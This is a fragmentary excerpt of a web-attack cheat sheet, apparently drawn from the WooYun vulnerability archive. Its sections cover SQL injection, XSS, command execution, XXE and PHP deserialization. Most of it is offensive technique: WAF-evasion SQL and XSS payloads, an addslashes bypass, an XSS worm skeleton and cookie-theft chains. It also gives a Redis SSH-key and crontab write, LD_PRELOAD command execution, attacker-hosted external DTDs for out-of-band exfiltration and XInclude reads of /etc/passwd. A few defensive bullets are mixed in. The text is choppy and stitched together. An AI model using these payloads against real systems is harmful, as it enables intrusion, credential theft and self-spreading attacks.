...
> Distilled from the three major injection knowledge bases of the WooYun vulnerability library: SQL injection (27,732 cases), XSS (7,532 cases), command execution (6,826 cases)
> Data source: wooyun_vulnerabilities.json (88,636 vulnerability records, 2010-2016)
> This document is for security research and defensive reference only
...
**Core formula**: SQL injection = confusion of the code/data boundary + user input elevated to executable SQL commands
...
| GET parameter | 24% | URL parameter |
...
5. Order-by column probing: order by N → increment until error
```
...
```sql
-- MySQL (nested-delay practical trick)
...
UNION/**/SELECT/**/1,2,3        -- comment replaces space
UNION%09SELECT                  -- Tab replacement
UNION%0ASELECT                  -- newline replacement
```
...
```
%bf%27 bypasses addslashes()   -- under GBK, the multi-byte character swallows the backslash
```
...
```sql
-- No information_schema; must obtain source code or guess table names
...
- Database least-privilege + error-message suppression + WAF deployment
...
| Email body/subject | opening the email | mailbox systems |
| Order notes | back-office view | e-commerce admin, ticketing systems |

**Hidden output points** (easily missed): HTTP headers (XFF/UA written to logs), WAP submission displayed on PC, client-side nickname rendered in Web, draft/review lists

#### Quick Context Determination

```
Output inside <script>? -> JS context (check quote type)
Output in an attribute value? -> attribute context (check attribute type)
...
```html
.<script src=http://localhost/1.js>.    <!-- Safedog: add a dot before and after -->
...
- Use the Flash interface to obtain user information instead of the Cookie
- Switch to a CSRF approach: directly perform sensitive operations (change password, add administrator, read token)
...
```javascript
// 1. Obtain the current user's identity (cookie/token)
// 2. Build content containing its own payload
// 3. Auto-post/share (AJAX POST)
// 4. Trigger condition: viewing/accessing spreads it
function worm(){
...
XSS + SQLi -> blind-steal Cookie -> back-office injection
XSS -> account hijacking -> privilege escalation -> worm propagation
Blind XSS (messages/tickets/feedback) -> obtain back-office admin Cookie
```

### 2.6 Defensive Measures

- **Output encoding** (core): HTML entities for HTML context, JS encoding for JS context, URL encoding for URL context
- CSP policy to restrict script sources
- HTTPOnly to protect the Cookie
- Whitelist input validation (avoid blacklists, there are always omissions)
- **Common mistakes**: filtering only the script tag, filtering only lowercase, front-end filtering that can be bypassed via interception, single-pass filtering bypassed by double-writing
...
|------|------|---------|
| `;` | separator | runs sequentially regardless of previous command's result |
| `\|` | pipe | previous output becomes next input |
| `` ` `` / `$()` | command substitution | executes the inner command and returns the result |
| `\|\|` | logical OR | runs the second only if the first fails |
| `&&` | logical AND | runs the second only if the first succeeds |
| `%0a` / `%0d%0a` | newline | URL-encoded newline separation |

#### Blind (No-Echo) Detection
...
**Redis Unauthorized Write SSH Public Key/Crontab**:
...
| L2 Shell-level | `system()`, `passthru()`, `shell_exec()`, backtick | System command with output |
...
|-----|------|-----|
| LD_PRELOAD | Hijack system library functions; mail() triggers loading of malicious .so | Can upload .so + mail() available |
...
| PHP-FPM/FastCGI | Modify PHP config to execute code | FPM port accessible / SSRF |
| ImageMagick | delegate feature command execution | IM used to process images |
| Windows COM | WScript.Shell component | Windows + COM extension |

**LD_PRELOAD Core Exploitation**:

```php
// Upload malicious .so (hijack geteuid function, internally call system())
...
- `disable_functions` to disable dangerous functions (be aware of bypass risks)
- Run web service with minimal privilege + container/chroot isolation
- Keep framework components updated promptly (Struts2/WebLogic/ImageMagick, etc.)

---

## IV. XXE (XML External Entity Injection)

### 4.1 Vulnerability Nature

```
XML input -> parser enables DTD/external entities -> entity reference parsed and executed -> file read/SSRF/RCE
```
...
| Entry Type | Detection Characteristics | Typical Scenario |
|----------|----------|----------|
...
| Data parsing | XML config import, RSS/Atom subscription | Admin backend, aggregation features |
| Protocol interaction | SAML authentication, WebDAV, XMPP | SSO login, file management |

**Quick Detection Flow**

```
1. Identify XML-processing endpoints → change Content-Type to application/xml for testing
2. Send basic DTD declaration → observe if parsed (error differences)
3. Try external entity reference → use file protocol to read known files
4. When no output → OOB exfiltration (DNS/HTTP callback)
```

### 4.3 Classic Payloads

#### File Read (With Output)
...
```xml
<!-- External DTD (hosted on attacker server evil.dtd) -->
...
|----------|------|----------|
| Encoding bypass | UTF-16BE/LE, UTF-7 encoded XML | WAF using ASCII pattern matching |
| Parameter entity nesting | Use `%entity;` instead of `&entity;` | General entity `&` is filtered |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | Cannot control DOCTYPE declaration |
| SVG embedding | Embed XXE entity inside SVG file | Only image uploads allowed |
| DOCX/XLSX embedding | Modify `[Content_Types].xml` inside Office document | Document upload feature |
| CDATA wrapping | Use CDATA section to bypass special character restrictions | Read files containing XML special characters |
...
- Input whitelist validation; upgrade XML parsing library
...
| `__toString()` | When object is used as string | Concatenated into dangerous function |
| `__call()` | Calling non-existent method | Chain call pivot |

**POP Chain Construction Approach**

```
1. Find entry: method calling $this->xxx property inside __wakeup()/__destruct()
2. Pivot: link to other classes via __toString()/__call()/__get()
3. Endpoint: reach dangerous functions like system()/eval()/file_put_contents()
